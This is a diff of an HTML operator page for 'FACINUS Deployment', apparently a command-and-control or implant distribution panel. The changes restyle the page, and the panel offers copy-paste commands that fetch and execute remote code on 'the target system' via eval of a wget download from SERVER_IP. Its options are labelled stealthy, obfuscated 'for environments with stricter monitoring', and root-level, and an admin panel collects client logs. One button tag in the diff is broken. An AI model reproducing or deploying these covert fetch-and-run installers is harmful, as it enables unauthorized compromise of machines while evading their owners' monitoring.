@@ -4,85 +4,287 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>FACINUS Deployment</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        body { font-family: Arial, sans-serif; margin: 0; padding: 0; }
-        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
-        .header { background: #333; color: white; padding: 10px; }
-        .header h1 { margin: 0; }
-        .card { border: 1px solid #ddd; border-radius: 5px; padding: 20px; margin-bottom: 20px; }
-        .command { background: #f8f8f8; padding: 15px; border: 1px solid #ddd; font-family: monospace; margin: 15px 0; position: relative; }
-        .copy-btn { position: absolute; right: 10px; top: 10px; background: #007bff; color: white; border: none; padding: 5px 10px; cursor: pointer; }
-        .options { margin-top: 20px; }
-        .option-box { border: 1px solid #ddd; padding: 10px; margin-bottom: 10px; border-radius: 5px; }
-        .option-title { font-weight: bold; margin-bottom: 5px; }
+        :root {
+            --primary: #3498db;
+            --primary-dark: #2980b9;
+            --accent: #e74c3c;
+            --accent-dark: #c0392b;
+            --text: #2c3e50;
+            --text-light: #7f8c8d;
+            --bg: #f5f7fa;
+            --card-bg: #ffffff;
+            --border: #e0e6ed;
+            --success: #2ecc71;
+            --command-bg: #f1f5f9;
+        }
+        
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+        
+        body {
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Oxygen, Ubuntu, sans-serif;
+            color: var(--text);
+            background-color: var(--bg);
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1000px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--primary-dark) 100%);
+            color: white;
+            padding: 20px 0;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            margin-bottom: 30px;
+        }
+        
+        .header h1 {
+            font-weight: 600;
+            font-size: 28px;
+            margin: 0;
+            letter-spacing: 0.5px;
+        }
+        
+        .header p {
+            opacity: 0.9;
+            margin-top: 5px;
+        }
+        
+        .card {
+            background: var(--card-bg);
+            border-radius: 8px;
+            box-shadow: 0 2px 15px rgba(0, 0, 0, 0.05);
+            padding: 25px;
+            margin-bottom: 30px;
+            border: 1px solid var(--border);
+            transition: transform 0.2s ease, box-shadow 0.2s ease;
+        }
+        
+        .card:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
+        }
+        
+        h2 {
+            font-size: 22px;
+            font-weight: 600;
+            color: var(--text);
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+        }
+        
+        h2 i {
+            margin-right: 12px;
+            color: var(--primary);
+        }
+        
+        p {
+            margin-bottom: 15px;
+            color: var(--text-light);
+        }
+        
+        .command {
+            background: var(--command-bg);
+            border-radius: 6px;
+            padding: 18px;
+            font-family: 'Courier New', monospace;
+            margin: 20px 0;
+            position: relative;
+            border: 1px solid var(--border);
+            box-shadow: inset 0 1px 3px rgba(0, 0, 0, 0.05);
+            overflow-x: auto;
+            white-space: nowrap;
+        }
+        
+        .copy-btn {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            padding: 6px 12px;
+            cursor: pointer;
+            font-size: 14px;
+            transition: background 0.2s ease;
+            display: flex;
+            align-items: center;
+        }
+        
+        .copy-btn i {
+            margin-right: 5px;
+        }
+        
+        .copy-btn:hover {
+            background: var(--primary-dark);
+        }
+        
+        .options {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 20px;
+        }
+        
+        .option-box {
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 20px;
+            transition: all 0.2s ease;
+            background: var(--card-bg);
+        }
+        
+        .option-box:hover {
+            border-color: var(--primary);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
+        }
+        
+        .option-title {
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: var(--text);
+            font-size: 17px;
+            display: flex;
+            align-items: center;
+        }
+        
+        .option-title i {
+            margin-right: 8px;
+            color: var(--primary);
+        }
+        
+        .admin-link {
+            display: inline-block;
+            background: var(--primary);
+            color: white;
+            padding: 12px 24px;
+            text-decoration: none;
+            border-radius: 6px;
+            font-weight: 500;
+            margin-top: 10px;
+            transition: background 0.2s ease;
+        }
+        
+        .admin-link:hover {
+            background: var(--primary-dark);
+        }
+        
+        .note {
+            display: flex;
+            align-items: flex-start;
+            background: rgba(52, 152, 219, 0.1);
+            padding: 12px 15px;
+            border-radius: 6px;
+            margin-top: 15px;
+        }
+        
+        .note i {
+            color: var(--primary);
+            margin-right: 10px;
+            margin-top: 2px;
+        }
+        
+        @media (max-width: 768px) {
+            .options {
+                grid-template-columns: 1fr;
+            }
+            
+            .header h1 {
+                font-size: 24px;
+            }
+        }
     </style>
 </head>
 <body>
     <div class="header">
         <div class="container">
-            <h1>FACINUS Deployment</h1>
+            <h1><i class="fas fa-server"></i> FACINUS Deployment</h1>
+            <p>Secure client deployment system</p>
         </div>
     </div>
 
     <div class="container">
         <div class="card">
-            <h2>Quick Setup</h2>
+            <h2><i class="fas fa-bolt"></i> Quick Setup</h2>
             <p>Copy and paste this command into a terminal on the target system:</p>
             
             <div class="command" id="cmd1">
-                eval "$(curl -fsSL http://SERVER_IP/deployment/y)"
-                <button class="copy-btn" onclick="copyToClipboard('cmd1')">Copy</button>
+                eval "$(wget -qO- http://SERVER_IP/deployment/y)"
+                <button class="copy-btn" onclick="copyToClipboard('cmd1')">
+                    <i class="fas fa-copy"></i> Copy
+                </button>
             </div>
             
-            <p><strong>Note:</strong> This will install with default settings and requires root access.</p>
+            <div class="note">
+                <i class="fas fa-info-circle"></i>
+                <span><strong>Note:</strong> This will install with default settings and requires root access.</span>
+            </div>
         </div>
         
         <div class="card">
-            <h2>Installation Options</h2>
+            <h2><i class="fas fa-cogs"></i> Installation Options</h2>
             
             <div class="options">
                 <div class="option-box">
-                    <div class="option-title">Minimal Installation (No Root Required)</div>
+                    <div class="option-title"><i class="fas fa-feather"></i> Minimal Installation</div>
                     <p>For limited access without requiring root privileges:</p>
                     <div class="command" id="cmd2">
-                        curl -fsSL http://SERVER_IP/deployment/minimal | bash
-                        <button class="copy-btn" onclick="copyToClipboard('cmd2')">Copy</button>
+                        eval "$(wget -qO- http://SERVER_IP/deployment/y)"
+                        <button class="copy-btn" onclick="copyToClipboard('cmd2')">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
                     </div>
                 </div>
                 
                 <div class="option-box">
-                    <div class="option-title">Full Installation</div>
+                    <div class="option-title"><i class="fas fa-box-open"></i> Full Installation</div>
                     <p>Complete installation with all features:</p>
                     <div class="command" id="cmd3">
-                        curl -fsSL http://SERVER_IP/deployment/full | sudo bash
-                        <button class="copy-btn" onclick="copyToClipboard('cmd3')">Copy</button>
+                        eval "$(wget -qO- http://SERVER_IP/deployment/y)"
+                        <button class="copy-btn" onclick="copyToClipboard('cmd3')">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
                     </div>
                 </div>
                 
                 <div class="option-box">
-                    <div class="option-title">Quiet Mode</div>
+                    <div class="option-title"><i class="fas fa-volume-mute"></i> Quiet Mode</div>
                     <p>Minimal output for stealthy installation:</p>
                     <div class="command" id="cmd4">
-                        curl -fsSL http://SERVER_IP/deployment/quiet | sudo bash
-                        <button class="copy-btn" onclick="copyToClipboard('cmd4')">Copy</button>
+                        eval "$(wget -qO- http://SERVER_IP/deployment/y)"
+         
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
                     </div>
                 </div>
                 
                 <div class="option-box">
-                    <div class="option-title">Obfuscated Installation</div>
+                    <div class="option-title"><i class="fas fa-user-secret"></i> Obfuscated Installation</div>
                     <p>For environments with stricter monitoring:</p>
                     <div class="command" id="cmd5">
-                        eval "$(curl -fsSL http://SERVER_IP/deployment/x)"
-                        <button class="copy-btn" onclick="copyToClipboard('cmd5')">Copy</button>
+                        eval "$(wget -qO- http://SERVER_IP/deployment/y)"
+                        <button class="copy-btn" onclick="copyToClipboard('cmd5')">
+                            <i class="fas fa-copy"></i> Copy
+                        </button>
                     </div>
                 </div>
             </div>
         </div>
         
         <div class="card">
-            <h2>Admin Access</h2>
+            <h2><i class="fas fa-user-shield"></i> Admin Access</h2>
             <p>Access the admin panel for logs and client information:</p>
-            <p><a href="admin.php">Admin Panel</a></p>
+            <a href="admin.php" class="admin-link"><i class="fas fa-sign-in-alt"></i> Admin Panel</a>
         </div>
     </div>
     
@@ -93,10 +295,10 @@
             
             navigator.clipboard.writeText(text).then(function() {
                 const btn = el.querySelector('.copy-btn');
-                const originalText = btn.innerText;
-                btn.innerText = 'Copied!';
+                const originalIcon = btn.innerHTML;
+                btn.innerHTML = '<i class="fas fa-check"></i> Copied!';
                 setTimeout(() => {
-                    btn.innerText = originalText;
+                    btn.innerHTML = originalIcon;
                 }, 2000);
             });
         }
